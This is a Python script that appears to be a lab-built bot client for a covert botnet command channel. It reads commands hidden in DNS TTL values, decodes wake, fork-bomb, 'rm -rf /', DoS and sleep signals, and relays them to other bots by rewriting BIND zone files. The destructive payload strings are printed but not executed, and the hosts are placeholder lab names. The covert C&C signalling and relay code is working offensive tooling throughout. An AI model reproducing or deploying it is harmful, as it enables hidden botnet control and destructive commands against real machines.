import subprocess
import sys
import re
import time

def getTTL(host, server):
	command = 'nslookup -debug %s %s' % (host, server)
	process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
	proc_stdout = process.communicate()[0].strip()

	m = re.search('ttl = (.+?)\n', proc_stdout)

	if m:
		found = m.group(1)
		#print found
		return int(found)
	else:
		return 0

# Once message received, send to all bots besides C&C
def propogateMsg(byte1, byte2, server):
	command = 'ifconfig'
	process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
	proc_stdout = process.communicate()[0].strip()
	m = re.search('inet addr:(.+?) ', proc_stdout)

	if m:
		myIP = m.group(1)

		# Set current TTL to signal other bots
		if myIP == '10.4.9.3':
			#notsus.com
			host = 'notsus.com'
			command = 'python cc.py /etc/bind/zones/db.%s w m' % host
			process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
			time.sleep(10)

			command = 'python cc.py /etc/bind/zones/db.%s %c %c' % (host, byte1, byte2)
			process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
			time.sleep(10)

			command = 'python cc.py /etc/bind/zones/db.%s s l' % host
			process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
			time.sleep(10)
		elif myIP == '10.4.9.1':
			#innocent.com
			host = 'innocent.com'
			command = 'python cc.py /etc/bind/zones/db.%s w m' % host
			process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
			time.sleep(10)

			command = 'python cc.py /etc/bind/zones/db.%s %c %c' % (host, byte1, byte2)
			process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
			time.sleep(10)

			command = 'python cc.py /etc/bind/zones/db.%s s l' % host
			process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
			time.sleep(10)
		elif myIP == '10.4.9.4':
			#regularserver.com
			host = 'regularserver.com'
			command = 'python cc.py /etc/bind/zones/db.%s w m' % host
			process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
			time.sleep(10)

			command = 'python cc.py /etc/bind/zones/db.%s %c %c' % (host, byte1, byte2)
			process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
			time.sleep(10)

			command = 'python cc.py /etc/bind/zones/db.%s %c %c' % (host, 's', 'l')
			process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
			time.sleep(10)

		else:
			print 'Not a DNS enabled bot, nothing the propogate'


if len(sys.argv) != 3:
	print "Usage: python getTTL.py <hostname> <dns-server>"
	exit()

else:
	prevTTL = 0
	active = False

	while True:
		newTTL = getTTL(sys.argv[1], sys.argv[2])

		# Check for new TTL
		if newTTL != prevTTL and newTTL != 0:
			prevTTL = newTTL

			# Write to file
			#str = '%s\n' % str(newTTL)
			#fo = open('ttl.txt', 'a')
			#fo.write(str)
			#fo.close()

			# Decode TTL
			half = (int(newTTL))/2
			byte1 = ''
			byte2 = ''
			for count1 in range(32, 128):
				value = count1 * 256
				for count2 in range(32, 128):
					if(half - value == count2):
						byte1 = chr(count1)
						byte2 = chr(count2)

			if byte1 == 'w' and byte2 == 'm':
				print 'Bot awakened'
				print 'Waiting for message...'
				active = True
			elif byte1 == 'f' and byte2 == 'b' and active:
				print 'Received fork bomb payload:\n:(){ :|: & };:\nPropogating message'
				propogateMsg(byte1, byte2, sys.argv[1])
			elif byte1 == 'r' and byte2 == 'f' and active:
				print 'Received rm payload:\nrm -rf /\nPropogating message'
				propogateMsg(byte1, byte2, sys.argv[1])
			elif byte1 == 'd' and byte2 == 's' and active:
				print 'Received DoS payload\nPropogating message'
				propogateMsg(byte1, byte2, sys.argv[1])
			elif byte1 == 's' and byte2 == 'l' and active:
				print 'Bot put to sleep'
				active = False

		time.sleep(1)
